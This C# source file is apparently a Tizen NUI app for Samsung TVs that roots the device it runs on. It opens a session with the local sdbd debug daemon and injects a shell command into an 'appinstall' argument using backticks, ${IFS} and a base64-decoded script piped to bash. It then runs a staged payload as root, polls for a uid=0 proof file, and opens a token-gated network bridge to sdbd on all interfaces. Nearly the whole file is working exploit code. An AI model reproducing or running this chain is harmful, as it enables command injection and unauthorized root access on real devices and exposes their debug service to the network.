using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Tizen.NUI;
using Tizen.NUI.BaseComponents;

public static class GhUIAgent
{
    // === v5: early-proof poll (modules can take minutes), scroll + close ===
    private const string BuildTime = "2026-10-09T19:05Z";

    private const string Res = "/opt/usr/apps/com.samsung.tv.ghservice/res/selfroot";
    private const string AppHome = "/tmp/selfroot-app";
    private const string Pkg = "archive-root-00b0000000000001";
    private const string Staging = "/home/owner/share/tmp/sdk_tools/" + Pkg;
    private const string OnDemand = "/home/owner/share/tmp/sdk_tools/on-demand";
    private const string Evidence = "/home/owner/share/tmp/sdk_tools/selfroot-evidence";
    private const string Mark = "/tmp/selfroot";
    private const string SafeModeFile = "/opt/usr/share/selfroot/safe-mode";
    private const int SessionAttempts = 18;          // 18 x 10s = 3 min for sdbd to come up
    private const string BridgeConfig = "/opt/usr/share/selfroot/bridge.conf";
    private const string BridgePortConfig = "/opt/usr/share/selfroot/bridge-port.conf";
    private const int DefaultBridgePort = 26103;
    private const int SdbPort = 26101;
    private const int BridgeTokenLength = 32;

    private static readonly object Gate = new object();
    private static readonly List<string> Events = new List<string>();
    private static double Progress = 0.0;
    private static string Banner = "BOOT AGENT v5";
    private static Color BannerColor = new Color(1f, 0.8f, 0.2f, 1f);
    private static bool Done;

    private static TextLabel BannerLabel;
    private static TextLabel VersionLabel;
    private static TextLabel HintLabel;
    private static TextLabel[] Lines = new TextLabel[20];
    private static View Bar;
    private static readonly List<string> History = new List<string>();
    private static int ScrollOffset;          // v5: 0 = tail, >0 = scrolled up
    private static bool UiDirty = true;        // v5: force refresh on scroll

    // v4: hold the NUI Timer in a static field. In v3.x it was a BuildUi local;
    // NUI Timer is a managed wrapper over a native handle, and with no rooted
    // reference the GC collects the wrapper mid-run and the native timer dies.
    // The UI then freezes on the last rendered frame (observed: frozen at
    // "ROOT CHAIN RUNNING" while the chain provably completed).
    private static Tizen.NUI.Timer _uiTimer;

    public static void Note(string text, double p)
    {
        lock (Gate)
        {
            Events.Add("[" + DateTime.UtcNow.ToString("HH:mm:ss") + "] " + text);
            Progress = p;
        }
    }
    public static void Note(string text) { Note(text, 0); }

    private class Agent : NUIApplication
    {
        protected override void OnCreate()
        {
            base.OnCreate();
            GhUIAgent.BuildUi();
            GhUIAgent.RunChain();
        }
    }

    private static string SelfRev()
    {
        try
        {
            var path = typeof(GhUIAgent).Assembly.Location;
            using (var sha = SHA256.Create())
            using (var stream = File.OpenRead(path))
            {
                var hash = sha.ComputeHash(stream);
                var sb = new StringBuilder();
                for (int i = 0; i < 6; i++) sb.Append(hash[i].ToString("x2"));
                return sb.ToString();
            }
        }
        catch (Exception e) { return "rev-err:" + e.GetType().Name; }
    }

    public static void BuildUi()
    {
        var w = Window.Instance;
        w.BackgroundColor = new Color(0f, 0f, 0f, 1f);
        w.Title = "GH BOOT AGENT v5";

        BannerLabel = new TextLabel
        {
            Text = Banner,
            PointSize = 40,
            TextColor = BannerColor,
            Position2D = new Position2D(120, 80),
            Size2D = new Size2D(1680, 56),
        };
        w.Add(BannerLabel);

        VersionLabel = new TextLabel
        {
            Text = "v5 build " + BuildTime + " rev " + SelfRev(),
            PointSize = 15,
            TextColor = new Color(0.45f, 0.45f, 0.5f, 1f),
            Position2D = new Position2D(120, 142),
            Size2D = new Size2D(1680, 26),
        };
        w.Add(VersionLabel);

        var hint = new TextLabel
        {
            Text = "self-root: Host PC IP = 127.0.0.1 | Up/Down: scroll log | Return: close",
            PointSize = 16,
            TextColor = new Color(0.6f, 0.6f, 0.6f, 1f),
            Position2D = new Position2D(120, 176),
            Size2D = new Size2D(1680, 28),
        };
        w.Add(hint);
        HintLabel = hint;

        var bgBar = new View
        {
            BackgroundColor = new Color(0.15f, 0.15f, 0.15f, 1f),
            Position2D = new Position2D(120, 218),
            Size2D = new Size2D(1680, 22),
        };
        w.Add(bgBar);

        Bar = new View
        {
            BackgroundColor = new Color(0.2f, 0.9f, 0.3f, 1f),
            Position2D = new Position2D(120, 218),
            Size2D = new Size2D(0, 22),
        };
        w.Add(Bar);

        for (int i = 0; i < Lines.Length; i++)
        {
            Lines[i] = new TextLabel
            {
                Text = "",
                PointSize = 18,
                TextColor = new Color(0.9f, 0.9f, 0.9f, 1f),
                Position2D = new Position2D(120, 264 + i * 34),
                Size2D = new Size2D(1680, 32),
            };
            w.Add(Lines[i]);
        }

        // v5: remote keys — Up/Down scroll the full history, Return closes
        // the app when the chain is done (or skips the wait anytime).
        w.KeyEvent += OnUiKey;

        _uiTimer = new Tizen.NUI.Timer(300);
        _uiTimer.Tick += OnTick;
        _uiTimer.Start();
    }

    private static void OnUiKey(object sender, Window.KeyEventArgs e)
    {
        var name = e.Key != null ? e.Key.KeyPressedName : null;
        if (string.IsNullOrEmpty(name)) return;
        lock (Gate)
        {
            if (name == "Up")
            {
                ScrollOffset = System.Math.Min(ScrollOffset + 1,
                    System.Math.Max(0, History.Count - Lines.Length));
                UiDirty = true;
            }
            else if (name == "Down")
            {
                ScrollOffset = System.Math.Max(0, ScrollOffset - 1);
                UiDirty = true;
            }
            else if (name == "Return" || name == "Exit" || name == "XF86Back")
            {
                CloseRequested = true;   // OnTick performs the exit on the UI thread
            }
        }
    }

    private static bool CloseRequested;

    private static void RequestExit()
    {
        try
        {
            var app = Tizen.Applications.Application.Current as NUIApplication;
            if (app != null) app.Exit();
        }
        catch { }
    }

    private static bool OnTick(object sender, Tizen.NUI.Timer.TickEventArgs e)
    {
        List<string> pending = null;
        double progress;
        string banner;
        Color bannerColor;
        bool done;
        bool dirty;
        int scroll;
        lock (Gate)
        {
            if (Events.Count > 0)
            {
                pending = new List<string>(Events);
                Events.Clear();
                History.AddRange(pending);
                if (History.Count > 400) History.RemoveRange(0, History.Count - 400);
            }
            progress = Progress;
            banner = Banner;
            bannerColor = BannerColor;
            done = Done;
            dirty = UiDirty;
            scroll = ScrollOffset;
            UiDirty = false;
        }
        if (pending != null || dirty)
        {
            // window over the full history; ScrollOffset counts back from tail
            int total = History.Count;
            int start = System.Math.Max(0, total - Lines.Length - scroll);
            for (int i = 0; i < Lines.Length; i++)
            {
                int idx = start + i;
                Lines[i].Text = idx < total ? History[idx] : "";
            }
            HintLabel.Text = scroll > 0
                ? $"scrolled {scroll} up | Down: newer | Return: close"
                : "Up: scroll log | Return: close";
        }
        if (BannerLabel.Text != banner) BannerLabel.Text = banner;
        if (bannerColor != BannerLabel.TextColor) BannerLabel.TextColor = bannerColor;
        var width = (int)(1680 * progress);
        Bar.Size2D = new Size2D(width, 22);
        if (CloseRequested)
        {
            RequestExit();
            return false;
        }
        return !done;
    }

    public static void RunChain()
    {
        Task.Run(() =>
        {
            var bootStarted = DateTime.UtcNow;
            try
            {
                Directory.CreateDirectory(Mark);
                Directory.CreateDirectory(AppHome);

                var status = new StringBuilder();
                foreach (var line in File.ReadAllLines("/proc/self/status"))
                {
                    if (line.StartsWith("Name:", StringComparison.Ordinal)
                        || line.StartsWith("Uid:", StringComparison.Ordinal)
                        || line.StartsWith("Cap", StringComparison.Ordinal))
                    {
                        status.Append(line.Trim()).Append(' ');
                    }
                }
                try
                {
                    status.Append("label=")
                        .Append(File.ReadAllText("/proc/self/attr/current").Trim()).Append(' ');
                }
                catch { }
                Note("agent v3 boot - " + status, 0.02);

                foreach (var name in new[]
                {
                    "SamsungTvArchiveRoot.dll",
                    "SamsungTvArchiveRoot.runtimeconfig.json",
                    "public.pem",
                    "passwd",
                    Pkg + ".tar.gz",
                    Pkg + ".tar.gz.signature",
                })
                {
                    File.Copy(System.IO.Path.Combine(Res, name), System.IO.Path.Combine(AppHome, name), true);
                }
                Note("staged chain artifacts -> " + AppHome, 0.05);

                var outer = new StringBuilder()
                    .Append("#!/bin/sh\n")
                    .Append("EV=").Append(Evidence).Append("\n")
                    .Append("mkdir -p \"$EV\" 2>/dev/null\n")
                    .Append("chmod 0777 \"$EV\" 2>/dev/null\n")
                    .Append("chsmack -a _ \"$EV\" 2>/dev/null\n")
                    .Append("{\n")
                    .Append("  date\n")
                    .Append("  id\n")
                    .Append("  cat /proc/self/attr/current\n")
                    .Append("  cp ").Append(AppHome).Append("/SamsungTvArchiveRoot.dll ")
                        .Append(AppHome).Append("/SamsungTvArchiveRoot.runtimeconfig.json ")
                        .Append(AppHome).Append("/public.pem ")
                        .Append(AppHome).Append("/passwd ").Append(Staging).Append("/\n")
                    .Append("  cp ").Append(AppHome).Append("/").Append(Pkg).Append(".tar.gz ")
                        .Append(AppHome).Append("/").Append(Pkg).Append(".tar.gz.signature ")
                        .Append(OnDemand).Append("/\n")
                    .Append("  /usr/bin/dotnet ").Append(Staging)
                        .Append("/SamsungTvArchiveRoot.dll ").Append(Pkg)
                        .Append(' ').Append(Staging).Append(' ').Append(OnDemand).Append('\n')
                    .Append("  echo payload-exit=$?\n")
                    .Append("  sleep 3\n")
                    .Append("  cp /tmp/selfroot-proof.txt \"$EV/selfroot-proof.txt\" 2>/dev/null\n")
                    .Append("  cp /tmp/archive-root-").Append(Pkg).Append(".log \"$EV/payload.log\" 2>/dev/null\n")
                    .Append("  cp ").Append(Mark).Append("/sdb-client.log \"$EV/sdb-client.log\" 2>/dev/null\n")
                    .Append("  echo \"--- evidence ---\"\n")
                    .Append("  ls -la \"$EV\"\n")
                    .Append("} > \"$EV/outer.log\" 2>&1\n")
                    .Append("chsmack -a _ \"$EV\"/* 2>/dev/null\n");
                File.WriteAllText(AppHome + "/selfroot-launch.sh", outer.ToString());
                Note("outer script staged (cat|bash, UEP-safe)", 0.08);

                var token = "app" + ((uint)Environment.TickCount).ToString("x8");
                var wrapped = "/bin/mkdir /tmp/s-" + token + " 2>/dev/null&&{ cat "
                    + AppHome + "/selfroot-launch.sh|bash;}";
                var encoded = Convert.ToBase64String(Encoding.ASCII.GetBytes(wrapped));
                var argument = "0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}"
                    + encoded + "|base64${IFS}-d|bash`.tpk";
                Note("injection armed (" + argument.Length + "/510 bytes)", 0.10);
                if (argument.Length > 510) throw new Exception("injection too big");

                lock (Gate)
                {
                    Banner = "WAITING FOR SDBD (127.0.0.1)";
                    BannerColor = new Color(1f, 0.8f, 0.2f, 1f);
                }

                // v4: safe mode — flag file skips the chain and the bridge.
                if (File.Exists(SafeModeFile))
                {
                    Note("safe-mode flag present: " + SafeModeFile, 0.0);
                    lock (Gate)
                    {
                        Banner = "SAFE MODE - CHAIN SKIPPED";
                        BannerColor = new Color(1f, 0.6f, 0.2f, 1f);
                        Done = true;
                    }
                    return;
                }

                lock (Gate)
                {
                    Banner = "WAITING FOR SDBD (127.0.0.1)";
                    BannerColor = new Color(1f, 0.8f, 0.2f, 1f);
                }

                // v4: single-shot chain. sdbd caches the dev host IP at startup
                // (live flips do nothing), so retrying past its boot window is
                // pointless — park with a clear status instead of polling forever.
                Socket s = null;
                int attempt = 0;
                while (attempt < SessionAttempts)
                {
                    attempt++;
                    lock (Gate) { Progress = 0.12; }
                    if (attempt == 1 || attempt % 6 == 0)
                    {
                        Note("sdbd wait " + attempt + "/" + SessionAttempts
                            + " (dev IP must be 127.0.0.1)", 0.12);
                    }
                    if (TrySession(out s)) break;
                    Thread.Sleep(10000);
                }
                if (s == null)
                {
                    Note("no sdbd session in " + SessionAttempts + " attempts", 0.12);
                    lock (Gate)
                    {
                        Banner = "SKIPPED - DEV IP NOT 127.0.0.1?";
                        BannerColor = new Color(0.9f, 0.3f, 0.2f, 1f);
                        Done = true;
                    }
                    return;
                }

                lock (Gate)
                {
                    Banner = "SDBD SESSION OPEN";
                    BannerColor = new Color(0.4f, 0.8f, 1f, 1f);
                    Progress = 0.35;
                }
                Note("sdbd answered localhost handshake (attempt " + attempt + ")", 0.35);

                using (s)
                {
                    s.Send(Frame("OPEN", 0x10, 0, Encoding.ASCII.GetBytes("capability:\0")));
                    string c; uint a0; byte[] p;
                    int guard = 0;
                    while (guard++ < 6)
                    {
                        if (!ReadFrame(s, out c, out a0, out _, out p)) break;
                        if (c == "OKAY") { s.Send(Frame("OKAY", 0x10, a0, new byte[0])); break; }
                        if (c == "CLSE") break;
                    }
                    Note("capability handshake done", 0.45);

                    var service = Encoding.ASCII.GetBytes("shell:" + argument + "\0");
                    s.Send(Frame("OPEN", 0x12, 0, service));
                    Note("injection fired via appinstall shell", 0.60);

                    // v5: 15s frame window (output can arrive buffered/late);
                    // frames stay advisory only — the proof poll is truth.
                    var frameLog = new List<string>();
                    var deadline = DateTime.UtcNow.AddSeconds(15);
                    s.ReceiveTimeout = 3000;
                    uint serviceId = 0x12;
                    while (DateTime.UtcNow < deadline)
                    {
                        uint fArg0; uint fArg1;
                        if (!ReadFrame(s, out c, out fArg0, out fArg1, out p)) break;
                        frameLog.Add(c);
                        if (c == "OKAY" || c == "WRTE")
                        {
                            try { s.Send(Frame("OKAY", serviceId, fArg0, new byte[0])); } catch { }
                        }
                        if (c == "CLSE") break;
                    }
                    s.ReceiveTimeout = 10000;
                    Note("injection frames: " + string.Join(",", frameLog), 0.65);
                }

                lock (Gate)
                {
                    Banner = "ROOT CHAIN RUNNING";
                    BannerColor = new Color(0.4f, 0.8f, 1f, 1f);
                }

                // v5: modules (e.g. the ad-daemon mask/stop loop) can take
                // minutes, and the outer script copies the EV proof late — so
                // launch.sh now also writes the proof to EV directly from the
                // root context. Poll BOTH paths for up to 6 minutes.
                const int pollTotal = 120;              // 120 x 3s = 6 min
                for (int i = 0; i < pollTotal; i++)
                {
                    Thread.Sleep(3000);
                    bool proof = false;
                    string proofText = null;
                    foreach (var proofPath in new[]
                    {
                        Evidence + "/selfroot-proof.txt",   // early root-context copy (v5)
                        "/tmp/selfroot-proof.txt",          // tar launch.sh copy
                    })
                    {
                        try
                        {
                            if (!File.Exists(proofPath)) continue;
                            if (File.GetLastWriteTimeUtc(proofPath) < bootStarted.AddSeconds(-5)) continue;
                            var text = File.ReadAllText(proofPath);
                            if (!text.Contains("SELFROOT-PROOF uid=0")) continue;
                            proof = true;
                            proofText = text;
                            break;
                        }
                        catch { }
                    }
                    lock (Gate) { Progress = 0.70 + 0.29 * (i / (double)pollTotal); }
                    if (i % 8 == 0) Note("polling for proof " + (i + 1) + "/" + pollTotal, 0.70 + 0.29 * (i / (double)pollTotal));
                    if (proof)
                    {
                        try { Note("PROOF:\n" + proofText, 1.0); } catch { }
                        lock (Gate)
                        {
                            Banner = "ROOT ACQUIRED - UNTETHERED";
                            BannerColor = new Color(0.2f, 1f, 0.3f, 1f);
                            Done = true;
                            Progress = 1.0;
                        }
                        StartBridge();
                        return;
                    }
                }
                lock (Gate)
                {
                    Banner = "NO FRESH PROOF AFTER 6 MIN";
                    BannerColor = new Color(0.9f, 0.3f, 0.2f, 1f);
                    Done = true;
                }
                Note("next boot retries automatically", 0);
            }
            catch (Exception e)
            {
                lock (Gate)
                {
                    Banner = "AGENT ERROR";
                    BannerColor = new Color(0.9f, 0.3f, 0.2f, 1f);
                    Done = true;
                }
                Note("EXCEPTION " + e.GetType().Name + ": " + e.Message, 0);
            }
        });
    }

    private static void StartBridge()
    {
        try
        {
            var token = File.ReadAllText(BridgeConfig).Trim();
            if (!IsBridgeToken(token))
            {
                Note("bridge unavailable: bridge.conf must contain 32 lowercase hex characters");
                return;
            }

            var bridgePort = DefaultBridgePort;
            if (File.Exists(BridgePortConfig)
                && (!int.TryParse(File.ReadAllText(BridgePortConfig).Trim(), out bridgePort)
                    || bridgePort < 1024
                    || bridgePort > 65535))
            {
                Note("bridge unavailable: bridge-port.conf must contain a port from 1024 to 65535");
                return;
            }

            var listener = new TcpListener(IPAddress.Any, bridgePort);
            listener.Start(8);
            Note("sdb bridge listening on port " + bridgePort);
            Task.Run(() => AcceptBridgeClients(listener, token));
        }
        catch (Exception error)
        {
            Note("bridge unavailable: " + error.GetType().Name + ": " + error.Message);
        }
    }

    private static bool IsBridgeToken(string token)
    {
        if (token == null || token.Length != BridgeTokenLength) return false;
        foreach (var character in token)
        {
            if (!((character >= '0' && character <= '9')
                || (character >= 'a' && character <= 'f'))) return false;
        }
        return true;
    }

    private static void AcceptBridgeClients(TcpListener listener, string token)
    {
        while (true)
        {
            try
            {
                var client = listener.AcceptTcpClient();
                Task.Run(() => HandleBridgeClient(client, token));
            }
            catch (Exception error)
            {
                BridgeLog("listener stopped: " + error.GetType().Name);
                return;
            }
        }
    }

    private static void HandleBridgeClient(TcpClient client, string token)
    {
        var peer = "unknown";
        TcpClient upstream = null;
        try
        {
            peer = client.Client.RemoteEndPoint == null
                ? peer
                : client.Client.RemoteEndPoint.ToString();
            client.NoDelay = true;
            var clientStream = client.GetStream();
            clientStream.ReadTimeout = 5000;
            var received = new byte[BridgeTokenLength];
            var count = 0;
            try
            {
                while (count < received.Length)
                {
                    var read = clientStream.Read(received, count, received.Length - count);
                    if (read <= 0) break;
                    count += read;
                }
            }
            catch (IOException)
            {
                BridgeLog("rejected " + peer + " (token timeout)");
                return;
            }
            if (count != received.Length)
            {
                BridgeLog("rejected " + peer + " (missing or short token)");
                return;
            }
            if (!TokensMatch(received, token))
            {
                BridgeLog("rejected " + peer + " (wrong token)");
                return;
            }

            clientStream.ReadTimeout = Timeout.Infinite;
            upstream = new TcpClient(AddressFamily.InterNetwork);
            upstream.NoDelay = true;
            upstream.Connect(IPAddress.Loopback, SdbPort);
            BridgeLog("authorized " + peer);

            var upstreamStream = upstream.GetStream();
            var finished = new ManualResetEvent(false);
            var toSdbd = Task.Run(() => CopyBridgeStream(clientStream, upstreamStream, finished));
            var toClient = Task.Run(() => CopyBridgeStream(upstreamStream, clientStream, finished));
            finished.WaitOne();
            client.Close();
            upstream.Close();
            Task.WaitAll(new[] { toSdbd, toClient }, 1000);
            BridgeLog("closed " + peer);
        }
        catch (Exception error)
        {
            BridgeLog("connection " + peer + " failed: " + error.GetType().Name);
        }
        finally
        {
            try { client.Close(); } catch { }
            if (upstream != null) { try { upstream.Close(); } catch { } }
        }
    }

    private static bool TokensMatch(byte[] supplied, string expected)
    {
        var expectedBytes = Encoding.ASCII.GetBytes(expected);
        var difference = 0;
        for (int i = 0; i < BridgeTokenLength; i++)
        {
            difference |= supplied[i] ^ expectedBytes[i];
        }
        return difference == 0;
    }

    private static void CopyBridgeStream(
        NetworkStream source,
        NetworkStream destination,
        ManualResetEvent finished)
    {
        try
        {
            var buffer = new byte[65536];
            while (true)
            {
                var count = source.Read(buffer, 0, buffer.Length);
                if (count <= 0) break;
                destination.Write(buffer, 0, count);
            }
        }
        catch { }
        finally { finished.Set(); }
    }

    private static readonly object BridgeLogLock = new object();

    private static void BridgeLog(string message)
    {
        var line = DateTime.UtcNow.ToString("o") + " " + message + "\n";
        lock (BridgeLogLock)
        {
            try
            {
                Directory.CreateDirectory(Evidence);
                File.AppendAllText(Evidence + "/bridge.log", line);
            }
            catch { }
        }
        Note("bridge " + message);
    }

    private static byte[] Frame(string cmd, uint arg0, uint arg1, byte[] data)
    {
        var c = Encoding.ASCII.GetBytes(cmd);
        uint check = 0;
        foreach (var b in data) check += b;
        var frame = new byte[24 + data.Length];
        Array.Copy(c, 0, frame, 0, 4);
        Array.Copy(BitConverter.GetBytes(arg0), 0, frame, 4, 4);
        Array.Copy(BitConverter.GetBytes(arg1), 0, frame, 8, 4);
        Array.Copy(BitConverter.GetBytes((uint)data.Length), 0, frame, 12, 4);
        Array.Copy(BitConverter.GetBytes(check), 0, frame, 16, 4);
        Array.Copy(BitConverter.GetBytes(~BitConverter.ToUInt32(c, 0)), 0, frame, 20, 4);
        Array.Copy(data, 0, frame, 24, data.Length);
        return frame;
    }

    private static readonly byte[] Cnxn =
    {
        0x43, 0x4e, 0x58, 0x4e, 0x00, 0x00, 0x10, 0x00,
        0x00, 0x00, 0x04, 0x00, 0x07, 0x00, 0x00, 0x00,
        0x32, 0x02, 0x00, 0x00, 0xbc, 0xb1, 0xa7, 0xb1,
        0x68, 0x6f, 0x73, 0x74, 0x3a, 0x3a, 0x00
    };

    private static int ReadExact(Socket s, byte[] buffer, int needed)
    {
        int got = 0;
        while (got < needed)
        {
            int n;
            try { n = s.Receive(buffer, got, needed - got, SocketFlags.None); }
            catch { return got; }
            if (n <= 0) return got;
            got += n;
        }
        return got;
    }

    private static bool ReadFrame(Socket s, out string cmd, out uint arg0, out uint arg1, out byte[] payload)
    {
        cmd = null; arg0 = 0; arg1 = 0; payload = new byte[0];
        var header = new byte[24];
        if (ReadExact(s, header, 24) < 24) return false;
        cmd = Encoding.ASCII.GetString(header, 0, 4);
        arg0 = BitConverter.ToUInt32(header, 4);
        arg1 = BitConverter.ToUInt32(header, 8);
        uint len = BitConverter.ToUInt32(header, 12);
        payload = new byte[len];
        if (len > 0) ReadExact(s, payload, (int)Math.Min(len, 8192));
        return true;
    }

    private static bool TrySession(out Socket s)
    {
        s = null;
        try
        {
            s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            {
                ReceiveTimeout = 10000, SendTimeout = 10000
            };
            s.Connect("127.0.0.1", 26101);
            s.Send(Cnxn);
            string c; uint a0, a1; byte[] p;
            if (!ReadFrame(s, out c, out a0, out a1, out p))
            {
                s.Close(); s = null; return false;
            }
            return true;
        }
        catch
        {
            if (s != null) { try { s.Close(); } catch { } }
            return false;
        }
    }

    public static void Main(string[] args)
    {
        new Agent().Run(args);
    }
}
